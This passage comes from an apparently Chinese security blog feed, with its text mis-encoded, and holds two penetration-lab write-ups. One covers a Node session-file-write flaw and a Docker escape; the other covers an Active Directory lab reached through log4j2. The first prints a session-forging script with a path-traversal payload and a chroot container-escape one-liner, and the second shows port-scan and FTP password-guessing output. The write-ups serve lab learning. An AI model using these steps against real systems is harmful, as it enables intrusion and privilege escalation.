function_">createServer</span>(<span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(req.<span class="property">url</span>, <span class="string">`http://<span class="subst">$&#123;req.headers.host&#125;</span>`</span>);</span><br><span class="line">  <span class="keyword">const</span> session = <span class="keyword">await</span> storage.<span class="title function_">getSession</span>(req.<span class="property">headers</span>.<span class="property">cookie</span>);</span><br><span class="line">  <span class="keyword">const</span> flashError = session.<span class="title function_">get</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (flashError) session.<span class="title function_">unset</span>(<span class="string">&quot;error&quot;</span>); </span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">setHtmlHeader</span> = (<span class="params"></span>) =&gt; res.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html; charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// --- è·¯ç”± ---</span></span><br><span class="line">  <span class="comment">// GET / - é¦–é¡µ</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span> &amp;&amp; url.<span class="property">pathname</span> === <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> userId = session.<span class="title function_">get</span>(<span class="string">&quot;userId&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (userId) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">redirect</span>(res, <span class="string">&quot;/dashboard&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> html = <span class="title function_">renderPage</span>(<span class="string">`</span></span><br><span class="line"><span class="string">      &lt;h1&gt;æ¬¢è¿æ¥åˆ°èŠ±å›­ç³»ç»Ÿ&lt;/h1&gt;</span></span><br><span class="line"><span class="string">      &lt;p&gt;è¯·ç™»å½•ä»¥æŸ¥çœ‹æˆ‘ä»¬çš„ä¸“å±èŠ±å‰æ”¶è—ã€‚&lt;/p&gt;</span></span><br><span class="line"><span class="string">      &lt;div class=&quot;links&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;a href=&quot;/login&quot;&gt;ç™»å½•&lt;/a&gt; | &lt;a href=&quot;/register&quot;&gt;æ³¨å†Œ&lt;/a&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">setHtmlHeader</span>();</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Set-Cookie&quot;</span>, <span class="keyword">await</span> storage.<span class="title function_">commitSession</span>(session));</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">end</span>(html);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// GET /login</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span> &amp;&amp; url.<span class="property">pathname</span> === <span class="string">&quot;/login&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> html = <span class="title function_">renderPage</span>(<span class="string">`</span></span><br><span class="line"><span class="string">      &lt;h1&gt;ğŸŒº ç™»å½•&lt;/h1&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;flashError ? <span class="string">`&lt;div class=&quot;error&quot;&gt;<span class="subst">$&#123;flashError&#125;</span>&lt;/div&gt;`</span> : <span class="string">&#x27;&#x27;</span>&#125;</span></span></span><br><span class="line"><span class="string">      &lt;form method=&quot;POST&quot; action=&quot;/login&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;ç”¨æˆ·å&quot; required /&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;å¯†ç &quot; required /&gt;</span></span><br><span class="line"><span class="string">        &lt;button type=&quot;submit&quot;&gt;è¿›å…¥èŠ±å›­&lt;/button&gt;</span></span><br><span class="line"><span class="string">      &lt;/form&gt;</span></span><br><span class="line"><span class="string">      &lt;div class=&quot;links&quot;&gt;&lt;a href=&quot;/register&quot;&gt;æ²¡æœ‰è´¦å·ï¼Ÿç‚¹å‡»æ³¨å†Œ&lt;/a&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>, <span class="string">&quot;Login&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">setHtmlHeader</span>();</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Set-Cookie&quot;</span>, <span class="keyword">await</span> storage.<span class="title function_">commitSession</span>(session));</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">end</span>(html);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// POST /login</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span> &amp;&amp; url.<span class="property">pathname</span> === <span class="string">&quot;/login&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> body = <span class="keyword">await</span> <span class="title function_">getBody</span>(req);</span><br><span class="line">    <span class="keyword">const</span> &#123; username, password &#125; = body;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> user = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (username === <span class="variable constant_">ADMIN_USER</span>.<span class="property">username</span> &amp;&amp; password === <span class="variable constant_">ADMIN_USER</span>.<span class="property">password</span>) &#123;</span><br><span class="line">      user = <span class="variable constant_">ADMIN_USER</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      user = users.<span class="title function_">find</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> === username &amp;&amp; u.<span class="property">password</span> === password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user) &#123;</span><br><span class="line">      session.<span class="title function_">set</span>(<span class="string">&quot;userId&quot;</span>, user.<span class="property">username</span>);</span><br><span class="line">      session.<span class="title function_">set</span>(<span class="string">&quot;role&quot;</span>, user.<span class="property">role</span> || <span class="string">&quot;user&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">redirect</span>(res, <span class="string">&quot;/dashboard&quot;</span>, <span class="keyword">await</span> storage.<span class="title function_">commitSession</span>(session));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      session.<span class="title function_">flash</span>(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;å‡­è¯æ— æ•ˆ ğŸ¥€&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">redirect</span>(res, <span class="string">&quot;/login&quot;</span>, <span class="keyword">await</span> storage.<span class="title function_">commitSession</span>(session));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// GET /register</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span> &amp;&amp; url.<span class="property">pathname</span> === <span class="string">&quot;/register&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> html = <span class="title function_">renderPage</span>(<span class="string">`</span></span><br><span class="line"><span class="string">      &lt;h1&gt;ğŸŒ» æ³¨å†Œ&lt;/h1&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;flashError ? <span class="string">`&lt;div class=&quot;error&quot;&gt;<span class="subst">$&#123;flashError&#125;</span>&lt;/div&gt;`</span> : <span class="string">&#x27;&#x27;</span>&#125;</span></span></span><br><span class="line"><span class="string">      &lt;form method=&quot;POST&quot; action=&quot;/register&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;è®¾ç½®ç”¨æˆ·å&quot; required /&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;è®¾ç½®å¯†ç &quot; required /&gt;</span></span><br><span class="line"><span class="string">        &lt;button type=&quot;submit&quot;&gt;åŠ å…¥ä¿±ä¹éƒ¨&lt;/button&gt;</span></span><br><span class="line"><span class="string">      &lt;/form&gt;</span></span><br><span class="line"><span class="string">      &lt;div class=&quot;links&quot;&gt;&lt;a href=&quot;/login&quot;&gt;å·²æœ‰è´¦å·ï¼Ÿå»ç™»å½•&lt;/a&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>, <span class="string">&quot;Register&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">setHtmlHeader</span>();</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Set-Cookie&quot;</span>, <span class="keyword">await</span> storage.<span class="title function_">commitSession</span>(session));</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">end</span>(html);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// POST /register</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span> &amp;&amp; url.<span class="property">pathname</span> === <span class="string">&quot;/register&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> body = <span class="keyword">await</span> <span class="title function_">getBody</span>(req);</span><br><span class="line">    <span class="keyword">const</span> &#123; username, password &#125; = body;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">find</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> === username) || username === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">      session.<span class="title function_">flash</span>(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;ç”¨æˆ·åå·²è¢«å ç”¨ ğŸŒµ&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">redirect</span>(res, <span class="string">&quot;/register&quot;</span>, <span class="keyword">await</span> storage.<span class="title function_">commitSession</span>(session));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    users.<span class="title function_">push</span>(&#123; username, password, <span class="attr">role</span>: <span class="string">&quot;user&quot;</span> &#125;);</span><br><span class="line">    session.<span class="title function_">flash</span>(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;æ³¨å†ŒæˆåŠŸï¼è¯·ç™»å½• ğŸŒ¹&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">redirect</span>(res, <span class="string">&quot;/login&quot;</span>, <span class="keyword">await</span> storage.<span class="title function_">commitSession</span>(session));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// POST /logout</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span> &amp;&amp; url.<span class="property">pathname</span> === <span class="string">&quot;/logout&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">redirect</span>(res, <span class="string">&quot;/&quot;</span>, <span class="keyword">await</span> storage.<span class="title function_">destroySession</span>(session));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// GET /dashboard (å—ä¿æŠ¤é¡µé¢)</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span> &amp;&amp; url.<span class="property">pathname</span> === <span class="string">&quot;/dashboard&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> userId = session.<span class="title function_">get</span>(<span class="string">&quot;userId&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> role = session.<span class="title function_">get</span>(<span class="string">&quot;role&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!userId) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">redirect</span>(res, <span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> adminContent = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (role === <span class="string">&quot;admin&quot;</span> || userId === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">      adminContent = <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div style=&quot;background: #ffe6e6; border: 2px solid red; padding: 10px; margin-top: 10px;&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;h3&gt;ğŸ‘‘ ç®¡ç†å‘˜é¢æ¿&lt;/h3&gt;</span></span><br><span class="line"><span class="string">          &lt;p&gt;&lt;strong&gt;Secret Flag:&lt;/strong&gt; FLAG&#123;FLOWER_POWER_OVERFLOW&#125;&lt;/p&gt;</span></span><br><span class="line"><span class="string">          &lt;p&gt;ä½ å·²è·å¾—èŠ±å›­çš„å®Œå…¨æ§åˆ¶æƒã€‚&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">      `</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> html = <span class="title function_">renderPage</span>(<span class="string">`</span></span><br><span class="line"><span class="string">      &lt;h1&gt;èŠ±å›­ä»ªè¡¨ç›˜ ğŸŒ¼&lt;/h1&gt;</span></span><br><span class="line"><span class="string">      &lt;p&gt;ä½ å¥½, &lt;strong&gt;<span class="subst">$&#123;userId&#125;</span>&lt;/strong&gt;!&lt;/p&gt;</span></span><br><span class="line"><span class="string">      &lt;div class=&quot;dashboard-content&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;å½“å‰èº«ä»½: &lt;strong&gt;<span class="subst">$&#123;role === <span class="string">&#x27;admin&#x27;</span> ? <span class="string">&#x27;é¦–å¸­å›­ä¸ ğŸ‘’&#x27;</span> : <span class="string">&#x27;è®¿å®¢ ğŸ&#x27;</span>&#125;</span>&lt;/strong&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;äº«å—è¿™å®é™çš„æ°›å›´å§...&lt;/p&gt;</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;adminContent&#125;</span></span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">      &lt;form method=&quot;POST&quot; action=&quot;/logout&quot; style=&quot;margin-top: 20px;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;button type=&quot;submit&quot; style=&quot;background: #999;&quot;&gt;é€€å‡ºç™»å½•&lt;/button&gt;</span></span><br><span class="line"><span class="string">      &lt;/form&gt;</span></span><br><span class="line"><span class="string">    `</span>, <span class="string">&quot;Dashboard&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">setHtmlHeader</span>();</span><br><span class="line">    <span class="comment">// å¦‚æœ Session æ²¡æœ‰å˜åŒ–åˆ™ä¸éœ€è¦ commitï¼Œä½†ä¸ºäº†åˆ·æ–°è¿‡æœŸæ—¶é—´é€šå¸¸å»ºè®® commit</span></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">end</span>(html);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 404</span></span><br><span class="line">  res.<span class="title function_">writeHead</span>(<span class="number">404</span>, &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain; charset=utf-8&quot;</span> &#125;);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&quot;é¡µé¢æœªæ‰¾åˆ°&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ğŸŒ¸ Flower Server running on http://localhost:3000&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç»™äº†ä¸€ä¸ªå‡çš„flagè€Œä¸”è¿™é‡Œå¯¹åº”çš„æ˜¯3000çš„æºç ï¼Œæ‰€ä»¥å°è¯•å»å®¡è®¡çœ‹çœ‹3000çš„æ¼æ´ç‚¹ï¼Œç„¶åæˆ‘æ²¡æ€ä¹ˆå­¦è¿‡jsæ‰€ä»¥è¿™é‡Œæ˜¯å’Œaiä¸€èµ·åšçš„å®¡è®¡</p><p>è¿™é‡ŒçŸ¥é“æ˜¯å¯ä»¥é€šè¿‡sessionå»å®ç°ä»»æ„æ–‡ä»¶å†™å…¥çš„ï¼Œä½†æ˜¯ä¸€å¼€å§‹æˆ‘ä¸€ç›´å†™ä¸è¿›å»ï¼Œåé¢æ‰¾äº†ä¸€ç¯‡æ–‡ç« </p><p><a href="https://xz.aliyun.com/news/91265">CVE-2025-61686-React Router ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´â€”â€”ä»ä»£ç å±‚é¢åˆ†ææ¼æ´æˆå› -å…ˆçŸ¥ç¤¾åŒº</a></p><p>å½“ç„¶è¿˜æ„Ÿè°¢Sublargeè€å¿ƒçœ‹æˆ‘çš„æ€è·¯ï¼Œæœ€åæˆ‘å°†æˆ‘çš„æ“ä½œå®Œæ•´ç»™ä»–çœ‹äº†ä¸€éï¼Œä»–è¯´é€»è¾‘ä¸Šæ²¡é”™è¯¯ã€‚ä½†æ­£æ˜¯æˆ‘å°†é—®é¢˜æè¿°äº†ä¸€éä½¿å¾—æˆ‘å¼€å§‹é‡æ–°è®¤çœŸåˆ†æè¿™ä¸ªé—®é¢˜ï¼Œæœ€åå‘ç°é—®é¢˜ã€‚</p><p>æ‰€ä»¥é‡åˆ°é—®é¢˜çš„æ—¶å€™è‡ªå·±å…ˆå°è¯•å°†é—®é¢˜æè¿°æ¸…æ¥šå†å»æ€è·¯ï¼</p><p><strong>æ¼æ´çš„åˆ©ç”¨</strong>:</p><p>è¿™é‡Œå°±å…ˆæˆä¸ºè„šæœ¬å°å­äº†ï¼Œåˆ†æçš„è¯ï¼Œæˆ‘æ„Ÿè§‰åé¢å¯ä»¥ä¸“é—¨å»æä¸€æ</p><p>å†™ä¸€ä¸ªä¼ªé€ sessionçš„è„šæœ¬ï¼ˆè‡ªå·±éªŒè¯äº†æ˜¯æ­£ç¡®çš„ï¼‰ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// remix-sign.js</span></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET</span> = <span class="string">&quot;mazesec&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> encoded = <span class="string">&quot;IjE3YjVhNjM0NGFhYTY2OTk3Ly4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL29wdC9mbG93ZXIuc2gi&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. HMAC-SHA256ï¼Œè¾“å‡ºæ™®é€š base64</span></span><br><span class="line"><span class="keyword">let</span> sig = crypto</span><br><span class="line">  .<span class="title function_">createHmac</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable constant_">SECRET</span>)</span><br><span class="line">  .<span class="title function_">update</span>(encoded)</span><br><span class="line">  .<span class="title function_">digest</span>(<span class="string">&quot;base64&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// æœ€ç»ˆ cookie å€¼</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;encoded&#125;</span>.<span class="subst">$&#123;sig&#125;</span>`</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªsessionå‰åŠéƒ¨åˆ†æ˜¯base64åŠ å¯†ï¼ŒååŠéƒ¨åˆ†æ˜¯ç­¾åï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦ä¿è¯ç­¾åæ­£ç¡®å°±å¥½äº†ï¼Œè€Œä¸”å†™å…¥sessionæ–‡ä»¶æ˜¯åœ¨ç™»å½•çš„æ—¶å€™ï¼Œæ‰€ä»¥æˆ‘ä»¬æ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼ˆç”¨æˆ·åä¸ºåå¼¹shellçš„å‘½ä»¤ï¼‰ï¼Œç„¶åç™»å½•çš„æ—¶å€™æ”¹ä¸€ä¸‹sessionè¿›è¡Œç™»å½•ã€‚</p><p><img src="/../images/achieve/2026/1/image-20260221212621647.png" alt="image-20260221212621647"></p><p>è¿™é‡Œè¿˜ç”¨åˆ°äº†shellè„šæœ¬é‡Œé¢<code>$&#123;&#125;</code>å˜é‡æ›¿æ¢ï¼Œå½“ç„¶å‘½ä»¤æ›¿æ¢ä¹Ÿå¯ä»¥å°±æ˜¯åå¼•å·ã€‚é‚£ä¹ˆå°±æ‹¿åˆ°shelläº†</p><h2 id="rootflag-dockeré€ƒé€¸"><a href="#rootflag-dockeré€ƒé€¸" class="headerlink" title="rootflag(dockeré€ƒé€¸)"></a>rootflag(dockeré€ƒé€¸)</h2><p>æ¥ä¸‹æ¥å°±æ˜¯dockeré€ƒé€¸äº†ï¼Œè¿™ç©æ„æˆ‘ä»æ¥æ²¡æ¥è§¦è¿‡ï¼Œä½†æ˜¯æˆ‘åˆç‰¹åˆ«æƒ³æŠŠå®ƒå¹²å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘å»ç½‘ä¸Šæœæ–‡ç« ã€‚å°è¯•äº†å‡ ç§æ–¹æ³•éƒ½ä¸è¡Œï¼Œé‚£ä¹ˆè¯•è¯•å·¥å…·å‘—ï¼cdkèµ°èµ·ï¼Œæœ€ååœ¨aiå’Œå·¥å…·çš„è¾…åŠ©ä¸‹æˆ‘æˆåŠŸé€ƒé€¸äº†</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import os; os.chroot(&quot;/proc/1/root&quot;); os.chdir(&quot;/&quot;); os.system(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™ä¸ªå°±æ˜¯æˆ‘åé¢è¦å­¦ä¹ çš„ä¸œè¥¿ï¼ï¼ï¼</p><p>&#x2F;rootä¸‹é¢æ²¡æœ‰flagï¼Œflagè¢«è—èµ·æ¥äº†ï¼æ²¡æƒ³åˆ°åœ¨è¿™é‡åˆ°äº†111ï¼Œæç¤ºæˆ‘ç”¨linpeasæ‰«æä¸€éï¼</p><p><img src="/../images/achieve/2026/1/image-20260221220307073.png" alt="image-20260221220307073"></p><p>è¿™é‡Œè¯´æ˜¯ç°åœ¨çš„&#x2F;rootæ˜¯è¢«æŒ‚è½½äº†ï¼Œæ‰€ä»¥çŒœæµ‹flagåœ¨æ²¡æŒ‚è½½å‰</p><p><img src="/../images/achieve/2026/1/image-20260221222338714.png" alt="image-20260221222338714"></p><p>è¿™é‡Œæ˜æ˜æ˜¯rootäº†ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸èƒ½ï¼Œæœ‰äº›å¥‡æ€ªï¼</p><p>ç„¶åè¿˜å‘ç°äº†è¿™ä¹ˆä¸ªå¥‡æ€ªçš„ç©æ„ï¼Œç„¶åä½†æ˜¯æˆ‘çš„ipæ­£å¥½æ˜¯10</p><p><img src="/../images/achieve/2026/1/image-20260221222536181.png" alt="image-20260221222536181"></p><p>ä½†æ˜¯ç°åœ¨ä¹Ÿå¯ä»¥æ”¹ï¼Œè¿™åº”è¯¥å°±æ˜¯çœŸrootäº†å§</p><p><img src="/../images/achieve/2026/1/image-20260221223158606.png" alt="image-20260221223158606"></p><p>ä¸€äº›æ€»ç»“ï¼Œè¿™å¯ä»¥è¯´æ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ¥è§¦è¿™ç§é¶æœºçš„æ¸—é€ï¼Œuseré‚£ä¸ªflagè¿˜å¥½ï¼Œå› ä¸ºæ‰“è¿‡ctfï¼Œä½†æ˜¯dockeré€ƒé€¸ç›¸å…³çš„ä¸œè¥¿æˆ‘æ˜¯ä»æœªæ¥è§¦è¿‡ã€‚ä½†æ˜¯é€šè¿‡æˆ‘çš„å¿«é€Ÿäº†è§£å’Œaiçš„è¾…åŠ©å’Œ111&amp;Sublargeçš„ä¸€äº›æç¤ºï¼Œæœ€ç»ˆè€—æ—¶5ä¸ªå°æ—¶å·¦å³æ‹¿ä¸‹æˆ‘çš„<strong>ç¬¬ä¸€å°</strong>æœºå­!!!</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¶æ„session </tag>
            
            <tag> dockeré€ƒé€¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘é•œCertify</title>
      <link href="/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/"/>
      <url>/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/</url>
      
        <content type="html"><![CDATA[<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>fscanæ‰«ä¸€ä¸‹ï¼Œ <code>./fscan -h 39.98.108.206 -p 0-65535</code></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">39.98.108.206:22 open</span><br><span class="line">39.98.108.206:80 open</span><br><span class="line">39.98.108.206:8983 open</span><br><span class="line">[*] alive ports len is: 3</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.98.108.206      code:200 len:612    title:Welcome to nginx!</span><br><span class="line">[*] WebTitle http://39.98.108.206:8983 code:302 len:0      title:None è·³è½¬url: http://39.98.108.206:8983/solr/</span><br><span class="line">[*] WebTitle http://39.98.108.206:8983/solr/ code:200 len:16555  title:Solr Admin</span><br></pre></td></tr></table></figure><p>å‘ç°äº†log4j2æ¡†æ¶ï¼Œå¯ä»¥æ‰“cve <a href="https://www.freebuf.com/articles/web/380568.html">log4j2åŸç†åˆ†æåŠæ¼æ´å¤ç°- CVE-2021-44228 - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p>éœ€è¦æ³¨æ„ä¸€ç‚¹çš„å°±æ˜¯javaç‰ˆæœ¬è¦æ”¹ä¸€ä¸‹ï¼Œæˆ‘ç”¨çš„1.8ï¼Œå¦å¤–å°±æ˜¯ç”¨åˆ°çš„å‡ ä¸ªç«¯å£éƒ½å¾—å»å¼€æ”¾ä¸€ä¸‹</p><p><img src="/../images/achieve/2026/1/image-20260219005635655.png" alt="image-20260219005635655"></p><p>æ²¡æƒé™sudo grcææƒæ‹¿åˆ°ç¬¬ä¸€ä¸ªflag</p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>è€2æ ·å¼„ä¸Šå»ï¼Œfscanæ‰«ä¸‹å†…ç½‘</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.9.26</span><br><span class="line">   [-&gt;]DESKTOP-CBKTVMO</span><br><span class="line">   [-&gt;]172.22.9.26</span><br><span class="line">[*] NetBios 172.22.9.7      [+] DC:XIAORANG<span class="keyword">\XIAORANG</span>-DC    </span><br><span class="line">[*] WebTitle http://172.22.9.19        code:200 len:612    title:Welcome to nginx!</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.9.7</span><br><span class="line">   [-&gt;]XIAORANG-DC</span><br><span class="line">   [-&gt;]172.22.9.7</span><br><span class="line">[*] WebTitle http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] NetBios 172.22.9.47     fileserver                          Windows 6.1</span><br><span class="line">[*] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        ï¿½Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] OsInfo 172.22.9.47  (Windows 6.1)</span><br><span class="line">[*] WebTitle http://172.22.9.7         code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] WebTitle http://172.22.9.19:8983   code:302 len:0      title:None è·³è½¬url: http://172.22.9.19:8983/solr/</span><br><span class="line">[*] WebTitle http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin</span><br><span class="line">[+] PocScan http://172.22.9.7 poc-yaml-active-directory-certsrv-detect </span><br><span class="line">å·²å®Œæˆ 15/16 [-] ftp 172.22.9.47:21 ftp ftp111 530 Login incorrect. </span><br><span class="line">å·²å®Œæˆ 15/16 [-] ftp 172.22.9.47:21 ftp 666666 530 Login incorrect. </span><br><span class="line">å·²å®Œæˆ 15/16 [-] ftp 